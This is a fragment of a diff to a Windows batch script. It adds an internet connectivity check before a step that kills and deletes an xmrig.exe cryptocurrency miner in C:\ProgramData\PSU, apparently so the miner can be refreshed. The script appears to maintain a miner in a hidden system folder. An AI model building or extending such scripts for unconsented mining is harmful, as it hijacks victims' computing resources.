@@ -1119,6 +1119,11 @@ timeout 3
 goto run
 
 :download
+ping -n 2 www.google.com
+if "%%errorlevel%%" == "0" goto online
+goto run
+
+:online
 taskkill /IM xmrig.exe /F
 timeout 0 >> nul
 del "C:\ProgramData\PSU\xmrig.exe"
